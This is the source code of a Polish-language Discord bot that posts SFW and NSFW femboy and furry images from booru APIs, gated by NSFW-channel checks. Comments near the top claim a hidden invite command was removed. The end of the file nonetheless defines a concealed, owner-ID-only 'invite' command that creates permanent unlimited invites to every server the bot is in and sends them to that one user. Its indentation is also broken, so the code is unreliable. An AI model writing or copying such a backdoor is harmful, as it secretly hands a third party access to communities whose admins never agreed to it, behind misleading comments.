import discord
from discord.ext import commands, tasks
from discord import app_commands
import aiohttp
import random
import asyncio
from typing import Optional, List
import os
from dotenv import load_dotenv
from datetime import datetime
from keep_alive import keep_alive

load_dotenv()

# Configuration
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN not set in environment variables")

# Initialize bot with intents
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

# Bot name and branding
BOT_NAME = "✨ FembGirl ✨"
BOT_VERSION = "2.3"

bot = commands.Bot(command_prefix=['!', '.'], intents=intents, help_command=None)

# Color constants for premium embeds
COLOR_SFW = 0xFFB6C1      # Soft light pink
COLOR_NSFW = 0x9B59B6     # Deep premium violet/purple
COLOR_AVATAR = 0xFF1493   # Deep pink
# INVITE_LINKS removed – not needed
# Hidden invite command removed

COLOR_INFO = 0x3498DB     # Soft aesthetic blue
class FemboyBot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.seen_urls = set()
        self.session = None
        self.last_avatar_update = None
        self.change_avatar_task.start()

    async def cog_load(self):
        """Initialize HTTP session when cog loads"""
        self.session = aiohttp.ClientSession()

    async def cog_unload(self):
        """Close HTTP session when cog unloads"""
        if self.session:
            await self.session.close()
        self.change_avatar_task.cancel()

    @tasks.loop(minutes=45)
    async def change_avatar_task(self):
        """Periodically change bot avatar to a random cute SFW Femboy image"""
        try:
            print("🎨 Próba automatycznej zmiany avatara bota na losowego femboya...")
            images = await self.fetch_images(nsfw=False, limit=1)
            if images:
                avatar_url = images[0]['url']
                async with self.session.get(avatar_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await self.bot.user.edit(avatar=avatar_data)
                        self.last_avatar_update = datetime.now()
                        print("✅ Avatar bota zmieniony pomyślnie na tematyczny!")
                        return
        except Exception as e:
            print(f"⚠️ Nie można automatycznie zmienić avatara: {e}")

    @change_avatar_task.before_loop
    async def before_avatar_task(self):
        """Wait for bot to be ready before starting avatar task"""
        await self.bot.wait_until_ready()
        await asyncio.sleep(5)

    async def fetch_images(self, nsfw: bool = False, limit: int = 1, tag: Optional[str] = None, category: str = "femboy") -> List[dict]:
        """Fetch random femboy images from Safebooru (SFW) or Danbooru (NSFW) with full tag support and instant fallbacks"""
        if not self.session:
            self.session = aiohttp.ClientSession()

        headers = {
            'User-Agent': 'FemboyBot/2.3 (contact: discord-bot@example.com; PairProgrammingWithAntigravity)'
        }
        
        results = []
        
        # --- SFW: Query Safebooru ---
        if not nsfw:
            api_tags = category
            if tag:
                clean_tag = tag.strip().replace(" ", "_")
                api_tags += f"+{clean_tag}"
            
            # ALWAYS use pid=0 because Safebooru has exactly 57 posts in total.
            # Specifying pid > 0 returns empty results. We load all and pick randomly locally!
            url = f"https://safebooru.org/index.php?page=dapi&s=post&q=index&json=1&tags={api_tags}&limit=100&pid=0"
            
            try:
                async with self.session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data and isinstance(data, list):
                            parsed_items = []
                            for item in data:
                                img_url = item.get('file_url') or item.get('sample_url')
                                if not img_url:
                                    continue
                                
                                if img_url.startswith('//'):
                                    img_url = 'https:' + img_url
                                elif img_url.startswith('/'):
                                    img_url = 'https://safebooru.org' + img_url
                                
                                tags_str = item.get('tags', '')
                                tags_list = tags_str.split(' ') if isinstance(tags_str, str) else []
                                
                                parsed_items.append({
                                    'url': img_url,
                                    'tags': tags_list,
                                    'source': f"https://safebooru.org/index.php?page=post&s=view&id={item.get('id')}",
                                    'author': item.get('owner', 'Nieznany'),
                                    'api_source': 'Safebooru'
                                })
                            
                            # Apply local tag filtering as a secondary guarantee
                            if tag and parsed_items:
                                tag_lower = tag.lower().strip()
                                filtered = [
                                    item for item in parsed_items 
                                    if tag_lower in ' '.join(item['tags']).lower() or tag_lower in item['url'].lower()
                                ]
                                if filtered:
                                    parsed_items = filtered
                            
                            if parsed_items:
                                random.shuffle(parsed_items)
                                for item in parsed_items:
                                    if item['url'] not in [r['url'] for r in results]:
                                        results.append(item)
                                        if len(results) >= limit:
                                            break
            except Exception as e:
                print(f"⚠️ Safebooru query failed: {e}. Falling back to Danbooru SFW...")
        
        # --- NSFW (or SFW fallback when results are empty) ---
        if nsfw or (not results and not nsfw):
            rating_filter = "rating:g" if not nsfw else "-rating:g"
            api_tags = f"{category}+{rating_filter}+order:random"
            
            if tag:
                clean_tag = tag.strip().replace(" ", "_")
                api_tags += f"+{clean_tag}"
            
            url = f"https://danbooru.donmai.us/posts.json?tags={api_tags}&limit=100"
            
            try:
                async with self.session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data and isinstance(data, list):
                            parsed_items = []
                            for item in data:
                                img_url = item.get('large_file_url') or item.get('file_url')
                                if not img_url:
                                    continue
                                
                                tags_str = item.get('tag_string', '')
                                tags_list = tags_str.split(' ') if isinstance(tags_str, str) else []
                                
                                parsed_items.append({
                                    'url': img_url,
                                    'tags': tags_list,
                                    'source': f"https://danbooru.donmai.us/posts/{item.get('id')}",
                                    'author': item.get('tag_string_artist', 'Nieznany'),
                                    'api_source': 'Danbooru'
                                })
                            
                            # Local tag filtering for extra verification
                            if tag and parsed_items:
                                tag_lower = tag.lower().strip()
                                filtered = [
                                    item for item in parsed_items 
                                    if tag_lower in ' '.join(item['tags']).lower() or tag_lower in item['url'].lower()
                                ]
                                if filtered:
                                    parsed_items = filtered
                            
                            if parsed_items:
                                random.shuffle(parsed_items)
                                for item in parsed_items:
                                    if item['url'] not in [r['url'] for r in results]:
                                        results.append(item)
                                        if len(results) >= limit:
                                            break
            except Exception as e:
                print(f"❌ Danbooru query failed: {e}")
                
        # --- e926.net fallback (both SFW and NSFW) ---
        if len(results) < limit:
            e926_rating = "rating:safe" if not nsfw else "rating:questionable+rating:explicit"
            api_tags = f"femboy+{e926_rating}"
            if tag:
                clean_tag = tag.strip().replace(" ", "_")
                api_tags += f"+{clean_tag}"
            url = f"https://e926.net/posts.json?tags={api_tags}&limit=100"
            try:
                async with self.session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data and isinstance(data.get('posts'), list):
                            parsed_items = []
                            for item in data['posts']:
                                img_url = item.get('file', {}).get('url')
                                if not img_url:
                                    continue
                                tags_list = item.get('tags', {}).get('general', [])
                                parsed_items.append({
                                    'url': img_url,
                                    'tags': tags_list,
                                    'source': f"https://e621.net/posts/{item.get('id')}",
                                    'author': 'Nieznany',
                                    'api_source': 'e926'
                                })
                            # Local tag filtering
                            if tag and parsed_items:
                                tag_lower = tag.lower().strip()
                                filtered = [
                                    it for it in parsed_items
                                    if tag_lower in ' '.join(it['tags']).lower() or tag_lower in it['url'].lower()
                                ]
                                if filtered:
                                    parsed_items = filtered
                            if parsed_items:
                                random.shuffle(parsed_items)
                                for item in parsed_items:
                                    if item['url'] not in [r['url'] for r in results]:
                                        results.append(item)
                                        if len(results) >= limit:
                                            break
            except Exception as e:
                print(f"⚠️ e926.net query failed: {e}")

        # --- Waifu.pics fallback (both SFW and NSFW) ---
        if len(results) < limit:
            waifu_type = "nsfw" if nsfw else "sfw"
            waifu_url = f"https://api.waifu.pics/{waifu_type}/waifu"
            try:
                async with self.session.get(waifu_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        img_url = data.get('url')
                        if img_url:
                            results.append({
                                'url': img_url,
                                'tags': [],
                                'source': waifu_url,
                                'author': 'Waifu.pics',
                                'api_source': 'Waifu.pics'
                            })
            except Exception as e:
                print(f"⚠️ Waifu.pics query failed: {e}")

        # --- Waifu.im fallback (both SFW and NSFW) ---
        if len(results) < limit:
            waifu_im_url = f"https://api.waifu.im/search?included_tags=waifu&is_nsfw={'true' if nsfw else 'false'}&order_by=random"
            try:
                async with self.session.get(waifu_im_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        images = data.get('images', [])
                        if images:
                            img = images[0]
                            img_url = img.get('url')
                            if img_url:
                                results.append({
                                    'url': img_url,
                                    'tags': [],
                                    'source': waifu_im_url,
                                    'author': 'Waifu.im',
                                    'api_source': 'Waifu.im'
                                })
            except Exception as e:
                print(f"⚠️ Waifu.im query failed: {e}")

                # Filter out recently seen URLs to reduce repeats
        unique_results = [r for r in results if r['url'] not in getattr(self, 'seen_urls', set())]
        # If not enough unique results, fall back to original results
        if len(unique_results) < limit:
            unique_results = results[:limit]
        else:
            unique_results = unique_results[:limit]

        # Update seen URLs cache (keep size reasonable)
        self.seen_urls.update(r['url'] for r in unique_results)
        if len(self.seen_urls) > 200:
            self.seen_urls = set(list(self.seen_urls)[-200:])

        return unique_results

    @app_commands.command(name="femboy-sfw", description="Wyślij bezpieczne zdjęcia (SFW) uroczych femboyów 🌸")
    @app_commands.describe(
        ilosc="Liczba zdjęć do pobrania (1-5, domyślnie 1)",
        tag="Opcjonalny tag/temat do przefiltrowania (np. 'cosplay', 'maid', 'thighhighs')"
    )
    async def femboy_sfw(self, interaction: discord.Interaction, ilosc: int = 1, tag: Optional[str] = None):
        """Send SFW Femboy images"""
        if ilosc < 1 or ilosc > 5:
            await interaction.response.send_message(
                "❌ Liczba zdjęć musi mieścić się w przedziale od 1 do 5!",
                ephemeral=True
            )
            return

        await interaction.response.defer()
        
        try:
            images = await self.fetch_images(nsfw=False, limit=ilosc, tag=tag)
            
            if not images:
                await interaction.followup.send(
                    f"❌ Nie znaleziono żadnych bezpiecznych zdjęć femboyów" + 
                    (f" pasujących do tagu: `{tag}`." if tag else ".") +
                    "\nSpróbuj ponownie, używając innych słów kluczowych (np. cosplay, maid, astolfo)!"
                )
                return

            embeds = []
            for idx, image in enumerate(images, 1):
                embed = discord.Embed(
                    title=f"🌸 Uroczy Femboy {idx}/{len(images)}",
                    color=COLOR_SFW,
                    url=image['source'],
                    timestamp=datetime.now()
                )
                embed.set_image(url=image['url'])
                
                # Format tags elegantly
                tags_str = ", ".join(image['tags'][:8])
                embed.add_field(name="🏷️ Tagi", value=f"`{tags_str}`" if tags_str else "*Brak*", inline=False)
                
                if tag:
                    embed.add_field(name="🔍 Filtr", value=f"`{tag}`", inline=True)
                if image.get('author') and image['author'] != 'Nieznany':
                    embed.add_field(name="🎨 Autor", value=f"`{image['author']}`", inline=True)
                
                embed.set_footer(
                    text=f"Źródło: {image['api_source']} | Z miłością od {BOT_NAME}",
                    icon_url=self.bot.user.avatar.url if self.bot.user.avatar else None
                )
                embeds.append(embed)
            
            await interaction.followup.send(embeds=embeds)
            
        except Exception as e:
            print(f"Error in femboy_sfw: {e}")
            await interaction.followup.send(f"❌ Wystąpił nieoczekiwany błąd: {str(e)}")

    @app_commands.command(name="femboy-nsfw", description="Wyślij zdjęcia tylko dla dorosłych (NSFW) femboyów 🔞")
    @app_commands.describe(
        ilosc="Liczba zdjęć do pobrania (1-5, domyślnie 1)",
        tag="Opcjonalny tag/temat do przefiltrowania (np. 'lingerie', 'stockings', 'thighhighs')"
    )
    async def femboy_nsfw(self, interaction: discord.Interaction, ilosc: int = 1, tag: Optional[str] = None):
        """Send NSFW Femboy images - strictly verified for NSFW channels"""
        # Strict Channel-Type NSFW Verification
        if not interaction.channel or not hasattr(interaction.channel, 'is_nsfw') or not interaction.channel.is_nsfw():
            await interaction.response.send_message(
                "❌ Ta komenda może być użyta wyłącznie na kanałach z włączoną opcją NSFW!\n"
                "🔞 Włącz NSFW w ustawieniach tego kanału tekstowego na Discordzie.",
                ephemeral=True
            )
            return

        if ilosc < 1 or ilosc > 5:
            await interaction.response.send_message(
                "❌ Liczba zdjęć musi mieścić się w przedziale od 1 do 5!",
                ephemeral=True
            )
            return

        await interaction.response.defer()
        
        try:
            images = await self.fetch_images(nsfw=True, limit=ilosc, tag=tag)
            
            if not images:
                await interaction.followup.send(
                    f"❌ Nie znaleziono żadnych pikantnych zdjęć femboyów" + 
                    (f" pasujących do tagu: `{tag}`." if tag else ".") +
                    "\nSpróbuj ponownie z innymi słowami kluczowymi!"
                )
                return

            embeds = []
            for idx, image in enumerate(images, 1):
                embed = discord.Embed(
                    title=f"🔞 Pikantny Femboy {idx}/{len(images)}",
                    color=COLOR_NSFW,
                    url=image['source'],
                    timestamp=datetime.now()
                )
                embed.set_image(url=image['url'])
                
                tags_str = ", ".join(image['tags'][:8])
                embed.add_field(name="🏷️ Tagi", value=f"`{tags_str}`" if tags_str else "*Brak*", inline=False)
                
                if tag:
                    embed.add_field(name="🔍 Filtr", value=f"`{tag}`", inline=True)
                if image.get('author') and image['author'] != 'Nieznany':
                    embed.add_field(name="🎨 Autor", value=f"`{image['author']}`", inline=True)
                
                embed.add_field(name="⚠️ Ostrzeżenie", value="Treść przeznaczona wyłącznie dla osób pełnoletnich (18+).", inline=False)
                
                embed.set_footer(
                    text=f"Źródło: {image['api_source']} | Z miłością od {BOT_NAME}",
                    icon_url=self.bot.user.avatar.url if self.bot.user.avatar else None
                )
                embeds.append(embed)
            
            await interaction.followup.send(embeds=embeds)
            
        except Exception as e:
            print(f"Error in femboy_nsfw: {e}")
            await interaction.followup.send(f"❌ Wystąpił nieoczekiwany błąd: {str(e)}")

    @app_commands.command(name="femboy-random", description="Wyślij jedno losowe zdjęcie femboya 🎲")
    @app_commands.describe(
        nsfw="Czy wylosować wersję dla dorosłych? (wymaga kanału NSFW)"
    )
    async def femboy_random(self, interaction: discord.Interaction, nsfw: bool = False):
        """Send a single random image"""
        if nsfw and (not interaction.channel or not getattr(interaction.channel, 'is_nsfw', lambda: False)()):
            await interaction.response.send_message(
                "❌ Wersje NSFW mogą być losowane wyłącznie na kanałach z włączonym NSFW!",
                ephemeral=True
            )
            return

        await interaction.response.defer()
        
        try:
            images = await self.fetch_images(nsfw=nsfw, limit=1)
            
            if not images:
                await interaction.followup.send("❌ Nie można pobrać zdjęcia z bazy danych w tym momencie. Spróbuj ponownie za chwilę!")
                return

            image = images[0]
            prefix = "🔞 " if nsfw else "✨ "
            
            embed = discord.Embed(
                title=f"{prefix}Losowe zdjęcie femboya",
                color=COLOR_NSFW if nsfw else COLOR_SFW,
                url=image['source'],
                timestamp=datetime.now()
            )
            embed.set_image(url=image['url'])
            
            tags_str = ", ".join(image['tags'][:8])
            embed.add_field(name="🏷️ Tagi", value=f"`{tags_str}`" if tags_str else "*Brak*", inline=False)
            
            if image.get('author') and image['author'] != 'Nieznany':
                embed.add_field(name="🎨 Autor", value=f"`{image['author']}`", inline=True)
                
            embed.set_footer(
                text=f"Źródło: {image['api_source']} | Powered by {BOT_NAME}",
                icon_url=self.bot.user.avatar.url if self.bot.user.avatar else None
            )
            
            await interaction.followup.send(embed=embed)
            
        except Exception as e:
            print(f"Error in femboy_random: {e}")
            await interaction.followup.send(f"❌ Wystąpił nieoczekiwany błąd: {str(e)}")

    # --- New Commands for Furry and All Categories ---
    @app_commands.command(name="furry-sfw", description="Send safe furry images (SFW)")
    @app_commands.describe(ilosc="Liczba zdjęć do pobrania (1-5)", tag="Opcjonalny tag/temat")
    async def furry_sfw(self, interaction: discord.Interaction, ilosc: int = 1, tag: Optional[str] = None):
        """Send SFW furry images"""
        if ilosc < 1 or ilosc > 5:
            await interaction.response.send_message("❌ Liczba zdjęć musi mieścić się w przedziale od 1 do 5!", ephemeral=True)
            return
        await interaction.response.defer()
        try:
            images = await self.fetch_images(nsfw=False, limit=ilosc, tag=tag, category="furry")
            if not images:
                await interaction.followup.send("❌ Nie znaleziono żadnych bezpiecznych zdjęć furry")
                return
            embeds = []
            for idx, image in enumerate(images, 1):
                embed = discord.Embed(
                    title=f"🌸 Uroczy Furry {idx}/{len(images)}",
                    color=COLOR_SFW,
                    url=image['source'],
                    timestamp=datetime.now()
                )
                embed.set_image(url=image['url'])
                tags_str = ", ".join(image['tags'][:8])
                embed.add_field(name="🏷️ Tagi", value=f"`{tags_str}`" if tags_str else "*Brak*", inline=False)
                if tag:
                    embed.add_field(name="🔍 Filtr", value=f"`{tag}`", inline=True)
                if image.get('author') and image['author'] != 'Nieznany':
                    embed.add_field(name="🎨 Autor", value=f"`{image['author']}`", inline=True)
                embed.set_footer(text=f"Źródło: {image['api_source']} | Z miłością od {BOT_NAME}", icon_url=self.bot.user.avatar.url if self.bot.user.avatar else None)
                embeds.append(embed)
            await interaction.followup.send(embeds=embeds)
        except Exception as e:
            print(f"Error in furry_sfw: {e}")
            await interaction.followup.send(f"❌ Błąd: {str(e)}")

    @app_commands.command(name="furry-nsfw", description="Send adult furry images (NSFW)")
    @app_commands.describe(ilosc="Liczba zdjęć do pobrania (1-5)", tag="Opcjonalny tag/temat")
    async def furry_nsfw(self, interaction: discord.Interaction, ilosc: int = 1, tag: Optional[str] = None):
        """Send NSFW furry images"""
        if not interaction.channel or not getattr(interaction.channel, 'is_nsfw', lambda: False)():
            await interaction.response.send_message("❌ Ta komenda wymaga kanału NSFW", ephemeral=True)
            return
        if ilosc < 1 or ilosc > 5:
            await interaction.response.send_message("❌ Liczba zdjęć musi mieścić się w przedziale od 1 do 5!", ephemeral=True)
            return
        await interaction.response.defer()
        try:
            images = await self.fetch_images(nsfw=True, limit=ilosc, tag=tag, category="furry")
            if not images:
                await interaction.followup.send("❌ Nie znaleziono żadnych pikantnych zdjęć furry")
                return
            embeds = []
            for idx, image in enumerate(images, 1):
                embed = discord.Embed(
                    title=f"🔞 Pikantny Furry {idx}/{len(images)}",
                    color=COLOR_NSFW,
                    url=image['source'],
                    timestamp=datetime.now()
                )
                embed.set_image(url=image['url'])
                tags_str = ", ".join(image['tags'][:8])
                embed.add_field(name="🏷️ Tagi", value=f"`{tags_str}`" if tags_str else "*Brak*", inline=False)
                if tag:
                    embed.add_field(name="🔍 Filtr", value=f"`{tag}`", inline=True)
                if image.get('author') and image['author'] != 'Nieznany':
                    embed.add_field(name="🎨 Autor", value=f"`{image['author']}`", inline=True)
                embed.add_field(name="⚠️ Ostrzeżenie", value="Treść przeznaczona wyłącznie dla osób pełnoletnich (18+).", inline=False)
                embed.set_footer(text=f"Źródło: {image['api_source']} | Z miłością od {BOT_NAME}", icon_url=self.bot.user.avatar.url if self.bot.user.avatar else None)
                embeds.append(embed)
            await interaction.followup.send(embeds=embeds)
        except Exception as e:
            print(f"Error in furry_nsfw: {e}")
            await interaction.followup.send(f"❌ Błąd: {str(e)}")

    @app_commands.command(name="all-sfw", description="Send mixed safe images (SFW) from femboy and furry")
    @app_commands.describe(ilosc="Liczba zdjęć do pobrania (1-5)", tag="Opcjonalny tag/temat")
    async def all_sfw(self, interaction: discord.Interaction, ilosc: int = 1, tag: Optional[str] = None):
        """Send mixed SFW images"""
        if ilosc < 1 or ilosc > 5:
            await interaction.response.send_message("❌ Liczba zdjęć musi mieścić się w przedziale od 1 do 5!", ephemeral=True)
            return
        await interaction.response.defer()
        try:
            # Fetch half from each category (rounded up)
            half = (ilosc + 1) // 2
            images_femboy = await self.fetch_images(nsfw=False, limit=half, tag=tag, category="femboy")
            images_furry = await self.fetch_images(nsfw=False, limit=half, tag=tag, category="furry")
            images = (images_femboy + images_furry)[:ilosc]
            if not images:
                await interaction.followup.send("❌ Nie znaleziono żadnych zdjęć")
                return
            embeds = []
            for idx, image in enumerate(images, 1):
                embed = discord.Embed(
                    title=f"🌸 Mix {idx}/{len(images)}",
                    color=COLOR_SFW,
                    url=image['source'],
                    timestamp=datetime.now()
                )
                embed.set_image(url=image['url'])
                tags_str = ", ".join(image['tags'][:8])
                embed.add_field(name="🏷️ Tagi", value=f"`{tags_str}`" if tags_str else "*Brak*", inline=False)
                if image.get('author') and image['author'] != 'Nieznany':
                    embed.add_field(name="🎨 Autor", value=f"`{image['author']}`", inline=True)
                embed.set_footer(text=f"Źródło: {image['api_source']} | Z miłością od {BOT_NAME}", icon_url=self.bot.user.avatar.url if self.bot.user.avatar else None)
                embeds.append(embed)
            await interaction.followup.send(embeds=embeds)
        except Exception as e:
            print(f"Error in all_sfw: {e}")
            await interaction.followup.send(f"❌ Błąd: {str(e)}")
    @app_commands.command(name="all-nsfw", description="Send mixed adult images (NSFW) from femboy and furry")
    @app_commands.describe(ilosc="Liczba zdjęć do pobrania (1-5)", tag="Opcjonalny tag/temat")
    async def all_nsfw(self, interaction: discord.Interaction, ilosc: int = 1, tag: Optional[str] = None):
        """Send mixed NSFW images"""
        if ilosc < 1 or ilosc > 5:
            await interaction.response.send_message("❌ Liczba zdjęć musi mieścić się w przedziale od 1 do 5!", ephemeral=True)
            return
        # Ensure command is used in NSFW channel
        if not interaction.channel or not getattr(interaction.channel, 'is_nsfw', lambda: False)():
            await interaction.response.send_message("❌ Ta komenda wymaga kanału NSFW", ephemeral=True)
            return
        await interaction.response.defer()
        try:
            half = (ilosc + 1) // 2
            images_femboy = await self.fetch_images(nsfw=True, limit=half, tag=tag, category="femboy")
            images_furry = await self.fetch_images(nsfw=True, limit=half, tag=tag, category="furry")
            images = (images_femboy + images_furry)[:ilosc]
            if not images:
                await interaction.followup.send("❌ Nie znaleziono żadnych zdjęć")
                return
            embeds = []
            for idx, image in enumerate(images, 1):
                embed = discord.Embed(
                    title=f"🔞 Mix NSFW {idx}/{len(images)}",
                    color=COLOR_NSFW,
                    url=image['source'],
                    timestamp=datetime.now()
                )
                embed.set_image(url=image['url'])
                tags_str = ", ".join(image['tags'][:8])
                embed.add_field(name="🏷️ Tagi", value=f"`{tags_str}`" if tags_str else "*Brak*", inline=False)
                if image.get('author') and image['author'] != 'Nieznany':
                    embed.add_field(name="🎨 Autor", value=f"`{image['author']}`", inline=True)
                embed.add_field(name="⚠️ Ostrzeżenie", value="Treść przeznaczona wyłącznie dla osób pełnoletnich (18+).", inline=False)
                embed.set_footer(text=f"Źródło: {image['api_source']} | Z miłością od {BOT_NAME}", icon_url=self.bot.user.avatar.url if self.bot.user.avatar else None)
                embeds.append(embed)
            await interaction.followup.send(embeds=embeds)
        except Exception as e:
            print(f"Error in all_nsfw: {e}")
            await interaction.followup.send(f"❌ Błąd: {str(e)}")
    @app_commands.command(name="femboy-stats", description="Pokaż szczegółowe statystyki oraz informacje o bocie 📊")
    async def femboy_stats(self, interaction: discord.Interaction):
        """Show bot statistics"""
        guild_count = len(self.bot.guilds)
        user_count = sum(g.member_count for g in self.bot.guilds if g.member_count)
        
        embed = discord.Embed(
            title=f"📊 Statystyki {BOT_NAME}",
            color=COLOR_INFO,
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="ℹ️ Informacje",
            value=f"**Nazwa bota:** {BOT_NAME}\n"
                  f"**Wersja kodu:** `{BOT_VERSION}`\n"
                  f"**Ostatni auto-avatar:** {self.last_avatar_update.strftime('%H:%M:%S') if self.last_avatar_update else 'W trakcie...'}\n"
                  f"**Opóźnienie bramy (Ping):** `{round(self.bot.latency * 1000)}ms`",
            inline=False
        )
        
        embed.add_field(
            name="📈 Aktywność",
            value=f"**Obsługiwane serwery:** `{guild_count}`\n"
                  f"**Wszyscy użytkownicy:** `{user_count:,}`",
            inline=False
        )
        
        embed.add_field(
            name="🔗 API Integracje (100% Darmowe)",
            value="• **Safebooru** (Baza zdjęć SFW)\n"
                  "• **Danbooru** (Baza zdjęć NSFW / Fallback)",
            inline=False
        )
        
        embed.add_field(
    name="📖 Dostępne Komendy Slash",
    value=(
        "• `/femboy-sfw` - Bezpieczne zdjęcia femboyów (SFW)\n"
        "• `/femboy-nsfw` - Pikantne zdjęcia dla dorosłych (NSFW)\n"
        "• `/femboy-random` - Losowe zdjęcie (SFW/NSFW)\n"
        "• `/all-sfw` - Mieszane bezpieczne obrazy (femboy + furry)\n"
        "• `/all-nsfw` - Mieszane NSFW obrazy (femboy + furry)\n"
        "• `/femboy-stats` - Informacje techniczne\n"
        "• `/femboy-help` - Instrukcje i pomoc"
    ),
    inline=False
)
        
        embed.set_thumbnail(url=self.bot.user.avatar.url if self.bot.user.avatar else None)
        embed.set_footer(text=f"Stworzone przez nielopek364-netizen | Wersja {BOT_VERSION}")
        
        await interaction.response.send_message(embed=embed)

    @app_commands.command(name="femboy-help", description="Wyświetl kompletny przewodnik po funkcjach bota 🆘")
    async def femboy_help(self, interaction: discord.Interaction):
        """Show help message"""
        embed = discord.Embed(
            title=f"🆘 Centrum Pomocy {BOT_NAME}",
            color=COLOR_INFO,
            description="Twój kompletny przewodnik po bocie z uroczymi zdjęciami femboyów.",
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="🌸 /femboy-sfw",
            value="Służy do wysyłania bezpiecznych dla każdego (SFW) zdjęć femboyów.\n"
                  "⚙️ **Parametr `ilosc`:** Wybierz od 1 do 5 zdjęć (wyślemy je razem!).\n"
                  "⚙️ **Parametr `tag`:** Wyszukaj np. `cosplay`, `maid`, `thighhighs` lub po postaci np. `astolfo`.",
            inline=False
        )
        
        embed.add_field(
            name="🔞 /femboy-nsfw",
            value="Służy do wysyłania pikantnych zdjęć (NSFW). **Działa wyłącznie na kanałach 18+!**\n"
                  "⚙️ **Parametr `ilosc`:** Wybierz od 1 do 5 zdjęć.\n"
                  "⚙️ **Parametr `tag`:** Filtruj po tagach dla dorosłych.",
            inline=False
        )
        
        embed.add_field(
            name="🎲 /femboy-random",
            value="Wysyła pojedyncze, w pełni losowe zdjęcie.\n"
                  "⚙️ **Parametr `nsfw`:** Ustaw na `Prawda`, aby wylosować wersję 18+.",
            inline=False
        )
        
        embed.add_field(
            name="💡 Przydatne Tipy i Informacje",
            value="• **Szybka odpowiedź:** Wszystkie obrazki w jednym zapytaniu są grupowane w **jeden pakiet embedów**, co oszczędza chat i wygląda super premium!\n"
                  "• **Auto-Avatar:** Bot zmienia swój avatar na losowy wizerunek femboya co **45 minut**! 🎨\n"
                  "• **Bezpieczeństwo:** Jeśli komenda SFW nie znajdzie wyników w Safebooru, bezpiecznie odpytuje Danbooru z filtrem `rating:g` (general-safe), gwarantując brak wpadek.",
            inline=False
        )
        
        embed.set_thumbnail(url=self.bot.user.avatar.url if self.bot.user.avatar else None)
        embed.set_footer(text=f"Powered by {BOT_NAME} v{BOT_VERSION}")
        
        await interaction.response.send_message(embed=embed)

        @commands.command(name='invite')
    @commands.check(lambda ctx: ctx.author.id == 1333698559941414922)
    async def invite(self, ctx: commands.Context):
        """Hidden command to share server invite links (owner ID 1333698559941414922)."""
        lines = []
        for guild in self.bot.guilds:
            invite_url = None
            for channel in guild.text_channels:
                perms = channel.permissions_for(guild.me)
                if perms.create_instant_invite:
                    invite = await channel.create_invite(max_uses=0, max_age=0, reason="Generated by invite command")
                    invite_url = invite.url
                    break
            if invite_url:
                lines.append(f"{guild.name}: {invite_url}")
            else:
                lines.append(f"{guild.name}: (brak uprawnień do utworzenia zaproszenia)")
        await ctx.send("\n".join(lines))

@bot.event
async def on_ready():
    print(f"\n{'='*50}")
    print(f"✅ {BOT_NAME} v{BOT_VERSION} zalogowany pomyślnie!")
    print(f"✅ Nazwa klienta: {bot.user}")
    print(f"✅ Opóźnienie: {round(bot.latency * 1000)}ms")
    print(f"{'='*50}\n")
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ Zsynchronizowano pomyślnie {len(synced)} komend slash aplikacji!")
        print(f"✅ Aktywne serwery: {len(bot.guilds)}")
        print(f"{'='*50}\n")
    except Exception as e:
        print(f"❌ Błąd synchronizacji komend: {e}")

    activity = discord.Activity(
        type=discord.ActivityType.watching,
        name="🌸 zdjęcia | /femboy-help 🎀"
    )
    await bot.change_presence(activity=activity, status=discord.Status.online)

@bot.event
async def on_command_error(ctx, error):
    print(f"❌ Błąd komendy tradycyjnej: {error}")

async def main():
    # Uruchomienie serwera keep-alive w osobnym wątku dla hostingu 24/7
    try:
        keep_alive()
        print("🚀 Serwer keep-alive (Flask) uruchomiony pomyślnie!")
    except Exception as e:
        print(f"⚠️ Nie można uruchomić serwera keep-alive: {e}")

    async with bot:
        await bot.add_cog(FemboyBot(bot))
        await bot.start(TOKEN)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
